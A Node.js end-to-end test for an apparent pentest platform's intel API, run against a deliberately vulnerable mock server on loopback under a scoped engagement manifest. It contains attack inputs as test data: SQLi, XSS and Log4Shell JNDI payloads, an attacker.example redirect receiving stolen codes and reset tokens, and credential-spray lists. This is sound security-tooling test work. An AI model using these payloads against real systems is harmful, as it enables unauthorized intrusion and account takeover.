#!/usr/bin/env node
/**
 * Full-logic E2E for the /api/intel surface.
 *
 * Boots the real server plus a mock vulnerable target app, then drives every
 * intel capability through HTTP and verifies the *logic*, not just status
 * codes: classifiers fire on crafted responses, hashes are recomputed
 * independently in this file, scope enforcement fails closed out-of-scope,
 * and export structures are validated field-by-field.
 *
 * Usage: node scripts/intel-e2e.mjs   (from the repo root, after `npm run build`)
 */
import { spawn } from 'node:child_process';
import { createHash } from 'node:crypto';
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const STATE = fs.mkdtempSync('/tmp/intel-e2e-');
const PORT = 2000 + Math.floor(Math.random() * 7000);
const BASE = `http://127.0.0.1:${PORT}`;

const sha256 = (s) => createHash('sha256').update(s, 'utf8').digest('hex');

// ── Mock vulnerable target ─────────────────────────────────────────────────
//
// Deterministic behaviors, each aimed at one classifier:
//   /api/v1/users        → 200 for every identity (missing authentication)
//   /admin/config        → 403 anon, 200 user+admin (broken function-level authz)
//   /oauth/authorize     → 302 to attacker host when redirect_uri contains it
//   /api/me              → 200 for ANY bearer/cookie (JWT flaw + session fixation)
//   POST /reset          → leaks a token and reflects the poisoned host
//   POST /reset/confirm  → accepts the same token twice (no invalidation)
//   /api/v1/orders/{1-6} → distinct 200 bodies (enumerable IDOR)
//   POST /login          → accepts admin/admin, never 429 (spray + weak cred)
const MOCK_HANDLERS = [
  {
    match: (u, m) => m === 'GET' && u.pathname === '/api/v1/users',
    handle: (_req, res, _u) => { res.writeHead(200, { 'content-type': 'text/plain' }); res.end('alice,bob,carol'); },
  },
  {
    match: (u, m) => m === 'GET' && u.pathname === '/admin/config',
    handle: (req, res) => {
      const authed = Boolean(req.headers.cookie || req.headers.authorization);
      if (!authed) { res.writeHead(403); res.end('forbidden'); return; }
      res.writeHead(200, { 'content-type': 'application/json' });
      res.end(JSON.stringify({ db: 'prod', flag: 'demo' }));
    },
  },
  {
    match: (u, m) => m === 'GET' && u.pathname === '/oauth/authorize',
    handle: (_req, res, u) => {
      const redirectUri = u.searchParams.get('redirect_uri') ?? '';
      if (redirectUri.includes('attacker.example')) {
        res.writeHead(302, { location: 'https://attacker.example/callback?code=stolen' });
        res.end();
        return;
      }
      res.writeHead(200); res.end('consent screen');
    },
  },
  {
    match: (u, m) => m === 'GET' && u.pathname === '/api/me',
    handle: (req, res) => {
      const authed = Boolean(req.headers.authorization || req.headers.cookie);
      if (!authed) { res.writeHead(401); res.end('no'); return; }
      res.writeHead(200); res.end('{"user":"session"}');
    },
  },
  {
    match: (u, m) => m === 'POST' && u.pathname === '/reset',
    handle: (_req, res) => {
      // Leaks the token AND reflects the attacker host from the poisoned headers.
      res.writeHead(200, { 'content-type': 'application/json' });
      res.end('{"ok":true,"reset_link":"https://attacker.example/reset?token=abcdef0123456789abcd"}');
    },
  },
  {
    match: (u, m) => m === 'POST' && u.pathname === '/reset/confirm',
    handle: (_req, res) => { res.writeHead(200); res.end('{"ok":true}'); }, // single-use not enforced
  },
  {
    match: (u, m) => m === 'GET' && /^\/api\/v1\/orders\/\d+$/.test(u.pathname),
    handle: (_req, res, u) => {
      const id = Number(u.pathname.split('/').pop());
      if (id >= 1 && id <= 6) {
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end(JSON.stringify({ order: id, secret: `payload-${id}` }));
        return;
      }
      res.writeHead(404); res.end('not found');
    },
  },
  {
    match: (u, m) => m === 'POST' && u.pathname === '/login',
    handle: (_req, res, _u, body) => {
      if (body === 'username=admin&password=admin') { res.writeHead(200); res.end('welcome'); return; }
      res.writeHead(401); res.end('bad credentials');
    },
  },
];

function startMockTarget() {
  return new Promise((resolve) => {
    const server = http.createServer((req, res) => {
      const chunks = [];
      req.on('data', c => chunks.push(c));
      req.on('end', () => {
        const u = new URL(req.url, 'http://mock.invalid');
        const body = Buffer.concat(chunks).toString('utf8');
        const handler = MOCK_HANDLERS.find(h => {
          try { return h.match(u, req.method); } catch { return false; }
        });
        if (handler) handler.handle(req, res, u, body);
        else { res.writeHead(404); res.end('no route'); }
      });
    });
    server.listen(0, '127.0.0.1', () => resolve({ server, port: server.address().port }));
  });
}

// ── T3MP3ST server ─────────────────────────────────────────────────────────
const srv = spawn('node', ['dist/server.js'], {
  cwd: ROOT,
  env: { ...process.env, T3MP3ST_PORT: String(PORT), T3MP3ST_STATE_DIR: STATE },
  stdio: ['ignore', 'ignore', 'inherit'],
});
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

async function req(method, path, body) {
  const res = await fetch(`${BASE}${path}`, {
    method,
    headers: body ? { 'content-type': 'application/json' } : {},
    body: body ? JSON.stringify(body) : undefined,
  });
  let data = null;
  try { data = await res.json(); } catch {}
  return { status: res.status, data };
}

let pass = 0, fail = 0;
const failures = [];
function check(name, ok, detail) {
  console.log(`${ok ? '✅' : '❌'} ${name}`);
  if (!ok) { fail++; failures.push({ name, detail: String(detail).slice(0, 300) }); }
  else pass++;
}
const eq = (a, b) => JSON.stringify(a) === JSON.stringify(b);

async function main() {
  const mock = await startMockTarget();
  const MOCK = `http://127.0.0.1:${mock.port}`;

  for (let i = 0; i < 120; i++) {
    await sleep(250);
    try { const r = await fetch(`${BASE}/api/preflight`, { signal: AbortSignal.timeout(2000) }); if (r.ok) break; } catch {}
  }

  // ── 1. Engagement manifest (ROE) ─────────────────────────────────────────
  const YAML = `
name: demo-engagement
operator: joshluxr
client: acme
authorization: written-roe-ref-42
scope:
  authorized_targets:
    - 127.0.0.1
  excluded_targets:
    - staging.acme.example
  allow_private_ranges: false
  allow_loopback: true
approvals:
  default: manual
budget:
  max_requests: 5000
  max_runtime_minutes: 240
`;
  const put = await req('PUT', '/api/intel/engagement', { yaml: YAML });
  check('engagement: ROE YAML parses into a normalized manifest',
    put.status === 200 && put.data?.engagement?.name === 'demo-engagement'
      && put.data?.engagement?.operator === 'joshluxr'
      && eq(put.data?.engagement?.scope?.authorizedTargets, ['127.0.0.1'])
      && put.data?.engagement?.scope?.allowPrivateRanges === false
      && put.data?.engagement?.rules?.maxConcurrentRequests === 4
      && put.data?.engagement?.approvals?.defaultMode === 'manual',
    JSON.stringify(put.data).slice(0, 200));
  const getEng = await req('GET', '/api/intel/engagement');
  check('engagement: manifest persists; scope derived from it',
    getEng.data?.engagement?.name === 'demo-engagement'
      && eq(getEng.data?.scope?.allowedHosts, ['127.0.0.1'])
      && getEng.data?.scope?.allowLoopback === true
      && String(getEng.data?.scopeDescription).includes('private ranges: denied')
      && getEng.data?.yaml === YAML,
    JSON.stringify(getEng.data?.scope));
  const badScope = await req('PUT', '/api/intel/engagement', { yaml: 'name: x\nscope:\n  authorized_targets: []' });
  check('engagement: empty scope rejected with 400', badScope.status === 400, badScope.status);
  const badYaml = await req('PUT', '/api/intel/engagement', { yaml: 'name: [unclosed' });
  check('engagement: malformed YAML rejected with 400', badYaml.status === 400, badYaml.status);
  const noBody = await req('PUT', '/api/intel/engagement', {});
  check('engagement: missing yaml key rejected with 400', noBody.status === 400, noBody.status);

  // ── 2. Seed an evidenced finding (the SQLi anchor everything else uses) ──
  const EV = {
    type: 'command', title: 'Error-based SQLi proof',
    summary: 'GET ?id=1 returned SQL syntax error echoed in response body',
    command: `curl "${MOCK}/api/v1/users?id=1'"`,
    uri: `${MOCK}/api/v1/users?id=1'`,
    source: 'tool', provenanceStrength: 'replayable',
  };
  const ev = await req('POST', '/api/evidence', EV);
  const EVID = ev.data?.id;
  check('ledger: evidence recorded', Boolean(EVID), JSON.stringify(ev.data).slice(0, 120));
  const finding = await req('POST', '/api/findings', {
    title: 'SQL injection in user lookup', target: `${MOCK}/api/v1/users`, severity: 'high',
    claim: 'id parameter is concatenated into a SQL query', family: 'web_api', confidence: 0.8,
    evidenceIds: [EVID],
  });
  const FID = finding.data?.id;
  check('ledger: finding seeded with linked evidence', Boolean(FID) && eq(finding.data?.evidenceIds, [EVID]), FID);

  // Extra evidenced findings for CVSS/export coverage.
  const evXss = await req('POST', '/api/evidence', {
    type: 'command', title: 'XSS reflection proof',
    summary: 'q parameter reflected unescaped', command: `curl "${MOCK}/search?q=<script>"`, source: 'tool',
  });
  const fXss = await req('POST', '/api/findings', {
    title: 'Reflected XSS in search', target: `${MOCK}/search`, severity: 'medium',
    claim: 'q reflected without encoding', evidenceIds: [evXss.data?.id],
  });
  const evCve = await req('POST', '/api/evidence', {
    type: 'log', title: 'Log4Shell proof CVE-2021-44228',
    summary: 'JNDI lookup payload executed (CVE-2021-44228)', command: 'curl -H "X-Api-Version: ${jndi:ldap://x}"', source: 'tool',
  });
  const fCve = await req('POST', '/api/findings', {
    title: 'Log4Shell RCE in header handling', target: `${MOCK}/api/v1/headers`, severity: 'high',
    claim: 'JNDI substitution reaches Log4j 2.14', evidenceIds: [evCve.data?.id],
  });
  check('ledger: XSS + CVE findings seeded with evidence', Boolean(fXss.data?.id) && Boolean(fCve.data?.id));

  // ── 3. CVSS auto-scoring: exact ruleset math ─────────────────────────────
  const cvss = await req('GET', '/api/intel/cvss');
  const byTitle = Object.fromEntries((cvss.data?.scored ?? []).map(f => [f.title, f]));
  const sqliCvss = byTitle['SQL injection in user lookup']?.cvss;
  check('cvss: SQLi → exact severity-mapped score + SQLi vector',
    sqliCvss?.baseScore === 7.8 && sqliCvss?.severity === 'high'
      && sqliCvss?.vector === 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N'
      && /SQLi/.test(sqliCvss?.scoreReason ?? ''),
    JSON.stringify(sqliCvss));
  const xssCvss = byTitle['Reflected XSS in search']?.cvss;
  check('cvss: XSS → scope-changed, user-interaction vector + medium score',
    xssCvss?.baseScore === 5.5 && xssCvss?.vector === 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N',
    JSON.stringify(xssCvss));
  const rceCvss = byTitle['Log4Shell RCE in header handling']?.cvss;
  check('cvss: RCE title → full-CIA vector; CVE extracted from evidence text',
    rceCvss?.vector === 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H' && rceCvss?.cve === 'CVE-2021-44228',
    JSON.stringify(rceCvss));
  const orderedScores = (cvss.data?.ordered ?? []).map(f => f.cvss.baseScore);
  check('cvss: ordered list is descending', eq(orderedScores, [...orderedScores].sort((a, b) => b - a)), orderedScores.join(','));

  // ── 4. Custody: server hashes must match an independent recomputation ────
  const seal = await req('POST', '/api/intel/custody/preserve', { findingId: FID });
  const rec = seal.data?.records?.[0];
  // intelFindingFromRecord composes evidence content as title\nsummary\ncommand\nuri
  const composed = [EV.title, EV.summary, EV.command, EV.uri].filter(Boolean).join('\n');
  check('custody: preserve returns one record per evidence entry with correct id scheme',
    seal.data?.preserved === 1 && rec?.id === `${FID}#0` && rec?.findingId === FID && rec?.evidenceType === EV.type,
    JSON.stringify(rec));
  check('custody: sha256 independently recomputed from evidence content matches',
    rec?.sha256 === sha256(composed) && rec?.sizeBytes === Buffer.byteLength(composed, 'utf8'),
    `server=${rec?.sha256?.slice(0, 16)} local=${sha256(composed).slice(0, 16)}`);
  const nf = await req('POST', '/api/intel/custody/preserve', { findingId: 'finding_nope' });
  check('custody: preserve on unknown finding → 404', nf.status === 404, nf.status);
  const cust = await req('GET', '/api/intel/custody');
  check('custody: chain verifies against live evidence', cust.data?.verification?.ok === true && cust.data?.verification?.checked >= 1,
    JSON.stringify(cust.data?.verification));

  // ── 5. Report gate: open while every high/critical finding is evidenced ──
  const gate = await req('GET', '/api/intel/report/gate');
  check('report gate: evidenced ledger passes', gate.data?.gate?.blocked === false && eq(gate.data?.gate?.violations, []),
    JSON.stringify(gate.data?.gate));

  // ── 6. Bug-intel memory: signature math exercised end-to-end ─────────────
  const m1 = await req('POST', '/api/intel/memory/merge', { findings: [
    { title: 'SQL injection in user lookup', severity: 'high', source: 'operator', location: `${MOCK}/api/v1/users/1` },
  ]});
  check('memory: first sighting is new', m1.data?.newCount === 1 && m1.data?.knownCount === 0, JSON.stringify({ n: m1.data?.newCount, k: m1.data?.knownCount }));
  const m2 = await req('POST', '/api/intel/memory/merge', { findings: [
    { title: 'SQL injection in user lookup', severity: 'high', source: 'operator', location: `${MOCK}/api/v1/users/99` },
  ]});
  check('memory: numeric-id variants coalesce into one signature (digits → #)',
    m2.data?.newCount === 0 && m2.data?.knownCount === 1, JSON.stringify({ n: m2.data?.newCount, k: m2.data?.knownCount }));
  const m3 = await req('POST', '/api/intel/memory/merge', { findings: [
    { title: 'SQL  injection   in user lookup', severity: 'critical', source: 'operator', location: `${MOCK}/api/v1/users/42?x=1` },
  ]});
  check('memory: whitespace-normalized title + query-stripped location still matches; count increments',
    m3.data?.newCount === 0 && m3.data?.knownCount === 1, JSON.stringify({ n: m3.data?.newCount, k: m3.data?.knownCount }));
  const mem = await req('GET', '/api/intel/memory');
  const mRec = (mem.data?.store?.records ?? []).find(r => r.title === 'SQL injection in user lookup');
  check('memory: one coalesced record, count=3, flagged recurring; summary rendered',
    mem.data?.store?.records?.length === 1 && mRec?.count === 3
      && mem.data?.recurring?.length === 1
      && (mRec?.signature ?? '').startsWith('sql injection in user lookup::http://#.#.#.#:#/api/v#/users')
      && /Signatures in store: \*\*1\*\*/.test(mem.data?.summary ?? ''),
    JSON.stringify({ n: mem.data?.store?.records?.length, count: mRec?.count, recurring: mem.data?.recurring?.length, sig: mRec?.signature }));

  // ── 7. Delta scan: normalization coverage rules ──────────────────────────
  const d = await req('POST', '/api/intel/delta', {
    baselineLocations: [`${MOCK}/api/v1/users?id=7`],
    candidateEndpoints: [`${MOCK}/API/V1/USERS`, '/api/v1/users', `${MOCK}/login`, `${MOCK}/api/v2/admin`],
  });
  const newUrls = (d.data?.newEndpoints ?? []).map(e => e.url).sort();
  check('delta: query-stripped baseline covers case-variant and bare-path forms',
    eq(newUrls, [`${MOCK}/api/v2/admin`, `${MOCK}/login`].sort()), JSON.stringify(newUrls));
  const fd = await req('POST', '/api/intel/delta', { baselineLocations: [`${MOCK}/api/v1/users`] });
  check('delta: ledger findings classified known vs fresh by location',
    fd.data?.findings?.known?.length === 1 && fd.data?.findings?.known?.[0]?.title === 'SQL injection in user lookup'
      && fd.data?.findings?.fresh?.length === 2,
    `known=${fd.data?.findings?.known?.length} fresh=${fd.data?.findings?.fresh?.length}`);

  // ── 8. Remediation verifier: mutation + per-class signature logic ────────
  const plan = await req('POST', `/api/intel/retests/${FID}/verify`, { vulnClass: 'sqli', originalPayload: "' OR '1'='1" });
  const variants = plan.data?.variants ?? [];
  // case-flip is intentionally a no-op when the payload has no SELECT/UNION,
  // so the contract is: >=3 variants actually mutate, all labels distinct.
  check('retest: builds >=3 real bypass mutations of the original payload',
    variants.length >= 3
      && new Set(variants.map(v => v.label)).size === variants.length
      && variants.filter(v => v.mutated !== "' OR '1'='1").length >= 3
      && variants.every(v => v.mutated.length > 0 && v.rationale.length > 0),
    variants.map(v => v.label).join(','));
  const labels = variants.map(v => v.label);
  const respond = async (responses) =>
    (await req('POST', `/api/intel/retests/${FID}/verify`, {
      vulnClass: 'sqli', originalPayload: "' OR '1'='1", variantResponses: responses,
    })).data?.verification;
  const allReflect = await respond(labels.map(l => ({ label: l, status: 200, responseBody: 'You have an error in your SQL syntax', elapsedMs: 10 })));
  check('retest: all variants reflect SQL error → not-remediated',
    allReflect?.verdict === 'not-remediated' && eq(allReflect?.bypassedVariants, labels), allReflect?.verdict);
  const noneReflect = await respond(labels.map(l => ({ label: l, status: 200, responseBody: 'No results', elapsedMs: 10 })));
  check('retest: all clean → fully-remediated, no bypasses', noneReflect?.verdict === 'fully-remediated' && eq(noneReflect?.bypassedVariants, []), noneReflect?.verdict);
  const mixed = await respond(labels.map((l, i) => ({ label: l, status: 200, responseBody: i === 0 ? 'PG::SyntaxError: SELECT' : 'ok', elapsedMs: 5 })));
  check('retest: partial survival → partial-bypass naming the survivor',
    mixed?.verdict === 'partial-bypass' && eq(mixed?.bypassedVariants, [labels[0]]), JSON.stringify(mixed?.bypassedVariants));
  const blind = await respond(labels.map((l, i) => ({ label: l, status: 200, responseBody: 'ok', elapsedMs: i === 1 ? 5000 : 5 })));
  check('retest: blind time-delay (>=4500ms) still detected as bypass',
    blind?.verdict === 'partial-bypass' && eq(blind?.bypassedVariants, [labels[1]]), JSON.stringify(blind?.bypassedVariants));
  const classHit = async (vulnClass, responses) =>
    (await req('POST', `/api/intel/retests/${FID}/verify`, {
      vulnClass, originalPayload: 'x', variantResponses: responses,
    })).data?.verification;
  const xss = await classHit('xss', [{ label: 'v1', status: 200, responseBody: '<svg onload=alert(1)>', elapsedMs: 1 }]);
  check('retest: xss signature (<svg reflection) detected', xss?.verdict === 'not-remediated' && eq(xss?.bypassedVariants, ['v1']), xss?.verdict);
  const redir = await classHit('open-redirect', [{ label: 'v1', status: 302, responseBody: '', elapsedMs: 1 }]);
  check('retest: open-redirect signature (3xx) detected', redir?.verdict === 'not-remediated', redir?.verdict);
  const idor = await classHit('idor', [{ label: 'v1', status: 200, responseBody: '{"tenant":"other"}', elapsedMs: 1 }]);
  check('retest: idor signature (200 on cross-tenant id) detected', idor?.verdict === 'not-remediated', idor?.verdict);
  const path = await classHit('path-traversal', [{ label: 'v1', status: 200, responseBody: 'root:x:0:0:root:/root:/bin/sh', elapsedMs: 1 }]);
  check('retest: path-traversal signature (root:x:) detected', path?.verdict === 'not-remediated', path?.verdict);
  const badClass = await req('POST', `/api/intel/retests/${FID}/verify`, { vulnClass: 'nope-class', originalPayload: 'x' });
  check('retest: unknown vuln class → 400', badClass.status === 400, badClass.status);
  const badFinding = await req('POST', '/api/intel/retests/finding_nope/verify', { vulnClass: 'sqli' });
  check('retest: unknown finding → 404', badFinding.status === 404, badFinding.status);

  // ── 9. Authz-matrix lane against the live mock ───────────────────────────
  const badMatrix = await req('POST', '/api/intel/authz-matrix', {});
  check('authz-matrix: empty body → 400', badMatrix.status === 400, badMatrix.status);
  const am = await req('POST', '/api/intel/authz-matrix', {
    endpoints: [
      { url: `${MOCK}/api/v1/users`, method: 'GET' },
      { url: `${MOCK}/admin/config`, method: 'GET' },
    ],
    identities: [
      { name: 'anon', role: 'anon' },
      { name: 'alice', role: 'user', cookie: 'session=alice' },
      { name: 'root', role: 'admin', bearerToken: 'tok-root' },
    ],
  });
  const amTitles = (am.data?.findings ?? []).map(f => f.title);
  check('authz-matrix: detects missing authentication on protected endpoint',
    amTitles.includes('Missing authentication on protected endpoint')
      // /users matches the ADMIN_PATTERN, so missing-auth there escalates to high
      && am.data?.findings?.find(f => f.title === 'Missing authentication on protected endpoint')?.severity === 'high',
    amTitles.join(' | '));
  check('authz-matrix: detects BFLA when a user reaches an admin endpoint (high)',
    amTitles.includes('Broken function-level authorization (BFLA)')
      && am.data?.findings?.find(f => f.title === 'Broken function-level authorization (BFLA)')?.severity === 'high',
    amTitles.join(' | '));
  const usersRow = (am.data?.matrix ?? []).find(r => r.url.endsWith('/api/v1/users'));
  const anonCell = usersRow?.cells?.anon;
  const expectedHash = sha256('alice,bob,carol').slice(0, 16);
  check('authz-matrix: response cell hash = independent sha256(body)[:16]',
    anonCell?.status === 200 && anonCell?.length === 'alice,bob,carol'.length && anonCell?.hash === expectedHash,
    JSON.stringify(anonCell));
  const adminRow = (am.data?.matrix ?? []).find(r => r.url.endsWith('/admin/config'));
  check('authz-matrix: anon 403 vs authed 200 captured per cell',
    adminRow?.cells?.anon?.status === 403 && adminRow?.cells?.alice?.status === 200 && adminRow?.cells?.root?.status === 200,
    JSON.stringify(adminRow?.cells));
  check('authz-matrix: findings persisted to the ledger', (am.data?.storedIds ?? []).length >= 2, JSON.stringify(am.data?.storedIds));

  // ── 10. Auth-flow lane against the live mock ─────────────────────────────
  const JWT = `${b64u(JSON.stringify({ alg: 'RS256', typ: 'JWT' }))}.${b64u(JSON.stringify({ sub: '12345', role: 'user' }))}.legit-signature`;
  const af = await req('POST', '/api/intel/flow/auth-flow', {
    authorizeUrls: [`${MOCK}/oauth/authorize`],
    protectedUrl: `${MOCK}/api/me`,
    bearerToken: JWT,
    preAuthCookie: 'sid=pre-auth-session',
    legitimateRedirectUri: `${MOCK}/callback`,
  });
  const afTitles = (af.data?.findings ?? []).map(f => f.title);
  check('auth-flow: OAuth redirect_uri bypass detected (high)',
    afTitles.includes('OAuth redirect_uri validation bypass')
      && af.data?.findings?.find(f => f.title === 'OAuth redirect_uri validation bypass')?.severity === 'high',
    afTitles.join(' | '));
  check('auth-flow: forged-JWT acceptance detected (critical)',
    afTitles.some(t => t.startsWith('JWT signature validation flaw'))
      && af.data?.findings?.find(f => f.title.startsWith('JWT signature validation flaw'))?.severity === 'critical',
    afTitles.join(' | '));
  check('auth-flow: pre-auth session non-invalidation detected (medium)',
    afTitles.includes('Pre-authentication session still valid'), afTitles.join(' | '));
  check('auth-flow: no scope blocks on the authorized mock', eq(af.data?.blocked, []), JSON.stringify(af.data?.blocked));

  // ── 11. Reset-chain lane against the live mock ───────────────────────────
  const rc = await req('POST', '/api/intel/flow/reset-chain', {
    resetRequestUrls: [`${MOCK}/reset`],
    resetConfirmUrl: `${MOCK}/reset/confirm`,
    account: 'operator-test@engagement.local',
  });
  const rcTitles = (rc.data?.findings ?? []).map(f => f.title);
  check('reset-chain: token leaked in response detected (high)',
    rcTitles.includes('Password-reset token leaked in HTTP response'),
    rcTitles.join(' | '));
  check('reset-chain: host-header poisoning detected (high)',
    rcTitles.some(t => t.startsWith('Password-reset host-header poisoning')),
    rcTitles.join(' | '));
  check('reset-chain: token reuse on confirm endpoint detected (high)',
    rcTitles.includes('Password-reset token not invalidated after use'),
    rcTitles.join(' | '));

  // ── 12. Enum-spray lane against the live mock ────────────────────────────
  const es = await req('POST', '/api/intel/flow/enum-spray', {
    endpoints: [{ url: `${MOCK}/api/v1/orders/1001` }],
    loginUrl: `${MOCK}/login`,
    usernames: ['admin', 'root'],
    passwords: ['admin', 'password', '123456'],
    maxEnumProbes: 6,
  });
  const esTitles = (es.data?.findings ?? []).map(f => f.title);
  check('enum-spray: enumerable IDOR harvest detected (high)',
    esTitles.includes('Broken object-level authorization (enumerable objects)')
      && es.data?.findings?.find(f => f.title === 'Broken object-level authorization (enumerable objects)')?.severity === 'high',
    esTitles.join(' | '));
  check('enum-spray: missing rate limiting on login detected (medium)',
    esTitles.includes('No rate limiting on credential endpoint'), esTitles.join(' | '));
  check('enum-spray: weak credential acceptance detected (high)',
    esTitles.includes('Weak credential accepted'), esTitles.join(' | '));
  const unknownLane = await req('POST', '/api/intel/flow/nope', {});
  check('flow: unknown lane → 404', unknownLane.status === 404, unknownLane.status);

  // ── 13. Report gate blocks on the unevidenced lane findings ──────────────
  const gate2 = await req('GET', '/api/intel/report/gate');
  const g2 = gate2.data?.gate;
  const laneIds = [...(am.data?.storedIds ?? []), ...(af.data?.findings ?? []).map(f => f.id), ...(rc.data?.storedIds ?? []), ...(es.data?.storedIds ?? [])];
  check('report gate: blocked once high/critical lane findings lack evidence',
    g2?.blocked === true && (g2?.violations ?? []).length >= 5
      && g2?.violations?.every(v => v.code === 'missing-evidence')
      && g2?.violations?.some(v => laneIds.includes(v.findingId) || (af.data?.storedIds ?? []).includes(v.findingId)),
    `blocked=${g2?.blocked} violations=${g2?.violations?.length}`);

  // ── 14. Exports (ledger now spans injection/xss/authz/auth/recon classes) ─
  const nav = await req('GET', `/api/intel/export/navigator?name=acme-q3`);
  const techIds = (nav.data?.techniques ?? []).map(t => t.techniqueID);
  check('navigator: layer 4.5 with query-supplied name; technique IDs well-formed',
    nav.data?.versions?.layer === '4.5' && nav.data?.name === 'acme-q3'
      && techIds.length >= 4 && techIds.every(t => /^T\d{4}$/.test(t)),
    techIds.join(' '));
  check('navigator: vuln classes map to the expected ATT&CK techniques',
    ['T1190', 'T1185', 'T1068', 'T1078'].every(t => techIds.includes(t))
      && (nav.data?.techniques ?? []).every(t => typeof t.score === 'number' && t.score > 0),
    techIds.join(' '));
  const stix = await req('GET', '/api/intel/export/stix?engagement=acme-q3');
  const objs = stix.data?.objects ?? [];
  const vulns = objs.filter(o => o.type === 'vulnerability');
  const inds = objs.filter(o => o.type === 'indicator');
  const rels = objs.filter(o => o.type === 'relationship');
  check('stix: bundle is 2.1 with identity + per-finding vulnerabilities',
    stix.data?.type === 'bundle' && /^bundle--[0-9a-f-]{36}$/.test(stix.data?.id ?? '')
      && objs.every(o => o.spec_version === '2.1')
      && objs.some(o => o.type === 'identity' && o.name === 'T3MP3ST engagement acme-q3')
      && vulns.length === (cvss.data?.scored?.length ?? 0) + laneIds.length + (am.data?.findings?.length ?? 0) - (am.data?.storedIds?.length ?? 0),
    `objects=${objs.length} vulns=${vulns.length}`);
  const cveVuln = vulns.find(v => v.name.includes('CVE-2021-44228'));
  check('stix: CVE surfaced in vulnerability name + external_references',
    Boolean(cveVuln) && eq(cveVuln?.external_references, [{ source_name: 'cve', external_id: 'CVE-2021-44228' }]),
    JSON.stringify(cveVuln?.external_references));
  const urlInd = inds.find(i => i.pattern.startsWith("[url:value = '"));
  check('stix: URL IOC → indicator with STIX pattern + indicates-relationship wiring',
    Boolean(urlInd) && urlInd?.pattern_type === 'stix' && urlInd?.labels.includes('malicious-activity')
      && rels.some(r => r.relationship_type === 'indicates' && r.source_ref === urlInd.id
        && vulns.some(v => v.id === r.target_ref)),
    urlInd?.pattern);
  const misp = await req('GET', '/api/intel/export/misp?engagement=acme-q3');
  const attrs = misp.data?.Event?.Attribute ?? [];
  check('misp: event threat level reflects worst severity (critical/high → 1)',
    misp.data?.Event?.info === 'T3MP3ST engagement acme-q3'
      && misp.data?.Event?.threat_level_id === '1' && /^\d{4}-\d{2}-\d{2}$/.test(misp.data?.Event?.date ?? ''),
    `tl=${misp.data?.Event?.threat_level_id}`);
  check('misp: url IOCs → Network-activity to_ids attributes; CVEs → vulnerability attributes',
    attrs.some(a => a.type === 'url' && a.category === 'Network activity' && a.to_ids === true)
      && attrs.some(a => a.type === 'vulnerability' && a.value === 'CVE-2021-44228' && a.to_ids === false && a.category === 'External analysis'),
    attrs.map(a => a.type).join(','));

  // ── 15. Scope enforcement fails closed out-of-scope ──────────────────────
  const oos = await req('POST', '/api/intel/flow/auth-flow', {
    authorizeUrls: ['http://10.255.255.7/oauth/authorize'],
    protectedUrl: 'http://10.255.255.7/api/me',
  });
  check('scope: out-of-scope private-range lane produces zero findings and audits the blocked host',
    eq(oos.data?.findings, []) && (oos.data?.blocked ?? []).some(b => b.includes('10.255.255.7')),
    JSON.stringify(oos.data?.blocked));
  const oosMatrix = await req('POST', '/api/intel/authz-matrix', {
    endpoints: [{ url: 'http://10.255.255.7/admin/config' }],
    identities: [{ name: 'anon', role: 'anon' }],
  });
  check('scope: out-of-scope authz row yields no cells/findings, host audited as blocked',
    eq(oosMatrix.data?.findings, []) && (oosMatrix.data?.blocked ?? []).length >= 1
      && Object.keys(oosMatrix.data?.matrix?.[0]?.cells ?? {}).length === 0,
    JSON.stringify(oosMatrix.data?.blocked));

  mock.server.close();
  console.log(`\n${pass}/${pass + fail} passed`);
  if (failures.length) {
    console.log('\nFailures:');
    for (const f of failures) console.log(`  ❌ ${f.name}\n     ${f.detail}`);
    process.exitCode = 1;
  }
}

function b64u(value) {
  return Buffer.from(value, 'utf8').toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

main()
  .catch(e => { console.error('FATAL', e); process.exit(1); })
  .finally(() => { try { srv.kill(); } catch {} });
